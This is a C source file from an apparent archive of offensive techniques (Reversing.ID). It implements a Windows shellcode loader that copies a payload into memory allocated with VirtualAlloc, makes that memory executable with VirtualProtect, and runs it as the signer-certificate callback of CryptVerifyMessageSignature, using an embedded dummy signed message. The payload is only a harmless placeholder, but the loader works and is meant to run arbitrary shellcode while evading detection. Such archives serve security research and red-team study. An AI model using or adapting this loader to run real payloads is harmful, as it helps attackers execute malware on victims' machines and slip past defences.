/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CryptVerifyMessageSignature

Note:
    tricky, you need signed message.
*/

#include <windows.h>
#include <stdint.h>

#pragma comment(lib,"crypt32")


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // any valid signature is required
    // here we have dummy signature from my local machine (@xathrya)
    CRYPT_VERIFY_MESSAGE_PARA   param;
    uint8_t     dummy[]     = "\x30\x82\x04\xca\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x07\x02\xa0\x82\x04\xbb\x30\x82\x04\xb7\x02\x01\x01\x31\x0f\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05\x05\x00\x30\x15\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x07\x01\xa0\x08\x04\x06\x64\x75\x6d\x6d\x79\x00\xa0\x82\x03\x14\x30\x82\x03\x10\x30\x82\x01\xf8\xa0\x03\x02\x01\x02\x02\x10\x57\x49\x6d\x93\x96\xb3\x54\x92\x47\x33\xed\xf4\xc9\x03\x92\x53\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05\x05\x00\x30\x31\x31\x2f\x30\x2d\x06\x03\x55\x04\x03\x13\x26\x57\x44\x4b\x54\x65\x73\x74\x43\x65\x72\x74\x20\x78\x61\x74\x68\x72\x79\x61\x2c\x31\x33\x32\x32\x34\x39\x36\x30\x37\x36\x34\x34\x32\x33\x36\x34\x33\x33\x30\x1e\x17\x0d\x32\x30\x30\x31\x33\x31\x31\x36\x31\x32\x34\x35\x5a\x17\x0d\x33\x30\x30\x31\x33\x31\x30\x30\x30\x30\x30\x30\x5a\x30\x31\x31\x2f\x30\x2d\x06\x03\x55\x04\x03\x13\x26\x57\x44\x4b\x54\x65\x73\x74\x43\x65\x72\x74\x20\x78\x61\x74\x68\x72\x79\x61\x2c\x31\x33\x32\x32\x34\x39\x36\x30\x37\x36\x34\x34\x32\x33\x36\x34\x33\x33\x30\x82\x01\x22\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x00\x30\x82\x01\x0a\x02\x82\x01\x01\x00\xde\x55\xaf\x38\x9d\xb7\x46\xea\x76\x47\xbe\x1b\x5d\xe8\x22\xa3\x87\xe2\x1b\x90\xee\x1f\x7e\x81\x37\x6f\x60\xed\xe0\xec\x58\xb0\x13\x89\xa6\xb0\xc3\xad\xde\x22\x85\x8d\x2e\x2a\x02\x18\xf5\x67\xac\x81\x60\x7f\x1e\x4e\x48\xf9\xee\xb1\x5a\x08\xd5\xd7\x38\x5b\xfe\xbf\xa4\xa1\x1e\x8c\x54\x96\xfd\x1f\x9d\xf7\x4c\xd1\x76\xee\xbf\xd4\x81\xca\x2b\xde\x2a\x1c\x35\x4f\x31\xc4\x39\x1b\xbb\x25\xb1\x3a\x1e\xa1\x33\x45\xbb\xd3\xa3\xcd\xe3\xf9\xa3\x38\x00\x57\x8b\x44\xcb\x34\xc5\x47\xe1\x76\x03\x82\xaf\xb7\x6f\xca\x82\xf5\x33\xe8\xd9\xcb\xa7\x92\x79\x75\xc2\x41\x0b\xf1\x8d\x99\x3b\x6f\x36\x62\x67\x36\x65\xe8\x8f\xa1\xa4\xa1\x5c\x29\xe1\x7f\xa5\xa8\x61\xa0\x87\xdd\x15\x83\x47\xb4\xb0\x5c\x71\x88\xc8\x5e\x67\x86\xaf\xbf\xda\x5e\xe8\xec\xf9\x3e\xa1\xce\xca\xa7\xe4\x28\x46\x8d\x3c\x8a\xaf\xbe\xd6\xcb\x8e\xcd\x05\x46\x4d\x2d\x41\xf3\x80\x1d\xd3\x37\xcc\x35\x2c\xf7\x13\xbc\x12\xc8\x18\x2b\xe0\xd6\xa7\xf2\x17\x05\x16\x99\xe8\xbb\x6b\x40\x12\x77\x9b\x7b\x38\x2c\x04\xb4\xf6\xab\x58\xf4\x54\x1f\xb3\xed\xc3\xb2\x73\xa3\x9f\xfd\x03\x01\x02\x03\x01\x00\x01\xa3\x24\x30\x22\x30\x0b\x06\x03\x55\x1d\x0f\x04\x04\x03\x02\x04\x30\x30\x13\x06\x03\x55\x1d\x25\x04\x0c\x30\x0a\x06\x08\x2b\x06\x01\x05\x05\x07\x03\x03\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05\x05\x00\x03\x82\x01\x01\x00\x1b\x10\xd2\x0a\x2f\x5b\x64\x64\xa6\x82\xe9\xc4\xbb\xc3\x9a\x6a\x22\x2b\xd1\x53\xf1\x9a\x5f\x07\x9e\xeb\x57\xd3\x8e\x3c\x1a\x0a\xd2\xc5\xfc\x49\x03\x15\x5b\x1a\x1a\x40\x42\x72\x3e\x73\x16\xeb\x71\x71\xf4\x62\x04\xbf\x8b\xf5\xe6\xdd\x9c\x6f\xeb\x2c\xd5\x53\x53\xa9\xfe\xda\x03\x20\x8a\x1e\xae\x61\xb6\x21\xbb\x2e\x7a\x86\x90\x3c\x77\x97\x23\xbd\xf0\x63\x63\xb1\x18\x5b\x57\xc6\xa2\xb4\x4f\xe0\xb7\x3f\x8b\xaf\x3b\x60\x74\x0f\x58\x2a\x98\x57\x97\x1c\x4a\xf4\x2a\x96\x4f\x55\x7f\x20\xa4\xab\xee\xe3\x72\x61\x51\x9a\x49\x01\x46\xa4\x15\x6d\xbb\x75\x18\x46\x32\xec\x74\x72\x08\x71\xf3\xfc\x46\xaa\x5d\xed\xea\x82\x14\xc6\x23\x40\x7b\xcd\xf8\xb7\x9c\xac\x36\x14\xd4\xe5\x1d\x9c\x56\x22\x1a\xaf\xab\x0c\xfe\x54\x36\x0c\x38\x4f\x84\x83\xaf\x10\x05\x5d\x86\x1a\xc6\x1b\x37\xc5\xf5\x1e\x47\xa0\x47\x09\x46\xf2\x3e\xb2\x4c\x2c\x62\x4c\xa9\x79\x0a\xae\xeb\xef\x29\xee\x64\x3b\xf5\xcb\xb0\x17\x5a\x75\x31\xbb\x0e\xb5\x06\xf7\x0f\xc9\xbb\x73\xab\x28\x5f\x39\xa4\x0f\xd2\x05\x15\x3b\x59\x12\x39\x53\x94\x81\x26\x92\xbc\xe2\x4a\xa6\x54\xbb\x31\x82\x01\x70\x30\x82\x01\x6c\x02\x01\x01\x30\x45\x30\x31\x31\x2f\x30\x2d\x06\x03\x55\x04\x03\x13\x26\x57\x44\x4b\x54\x65\x73\x74\x43\x65\x72\x74\x20\x78\x61\x74\x68\x72\x79\x61\x2c\x31\x33\x32\x32\x34\x39\x36\x30\x37\x36\x34\x34\x32\x33\x36\x34\x33\x33\x02\x10\x57\x49\x6d\x93\x96\xb3\x54\x92\x47\x33\xed\xf4\xc9\x03\x92\x53\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x05\x05\x00\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00\x04\x82\x01\x00\x26\xbb\xc1\xe1\x44\xfb\x6f\x47\x5f\x35\x47\x22\xd9\x7b\x99\xfa\xa1\x02\xd8\x21\xeb\xcf\x9a\x39\x6b\x3f\xca\x9c\xb7\xef\x39\x65\x1b\xc6\xc9\x32\x20\x0b\xda\xe7\x5b\xaf\x76\x59\x38\xc9\xd4\x5a\xa7\xd9\xd7\x19\xb1\xb4\xeb\x77\xc0\xb4\x91\xf2\x1b\x1c\x25\x77\x7d\x02\xa8\xab\x4d\x13\x71\x8e\x96\xf5\x80\xab\x09\x00\xa9\x9c\x41\x1a\xf0\x66\x14\xf0\x95\xaf\xe6\x80\xa7\x4a\x70\x25\x9a\xf9\xa4\xc0\xf5\x72\x4f\x9e\x7e\xad\x8a\x93\xc8\xe4\x80\xaf\x33\xd5\xe7\xb0\x50\x7d\x0b\x97\xea\x27\x4e\xc2\x32\x07\xe4\x00\x63\x09\x61\xb8\xf7\xd0\xab\xf5\x7b\xd0\x1f\x98\x2b\x12\x9f\x16\xc0\xb2\x2e\xeb\x47\xdc\x92\x31\x7d\x66\x3d\xed\x3e\xe2\x03\x49\xa1\xe2\x9c\x34\xcc\x93\x54\x85\x45\xe7\xac\xa6\x81\xd5\x61\x94\x38\x39\xbd\x84\x94\x46\x50\x85\x04\xca\xbe\xf0\xdb\x3a\x1e\xe4\x8a\x2d\x2a\xac\xfa\x87\x41\x1e\x00\x90\x44\xf0\x19\x6e\x48\xa5\xe7\x00\x18\x4f\x32\xb9\x04\x21\x48\xec\x25\x49\xb5\x34\xc5\x9d\x20\x9e\xa9\x7c\xc9\x74\x8f\x76\xec\x38\x9e\x41\xb0\x6a\xf1\x98\xec\xaa\x10\x27\xd6\xf9\x86\xfa\x6c\xf0\xc8\x4d\x01\x8c\xda\xbb\xf1\x64";
    uint32_t    dummy_len   = 1230;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        ZeroMemory (&param, sizeof(CRYPT_VERIFY_MESSAGE_PARA));
        param.cbSize = sizeof(CRYPT_VERIFY_MESSAGE_PARA);
        param.dwMsgAndCertEncodingType = PKCS_7_ASN_ENCODING | X509_ASN_ENCODING;
        param.pfnGetSignerCertificate  = (PFN_CRYPT_GET_SIGNER_CERTIFICATE)runtime;

        // triggering message verification require valid certificate
        CryptVerifyMessageSignature (&param, 0, dummy, dummy_len, NULL, NULL, NULL); 
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}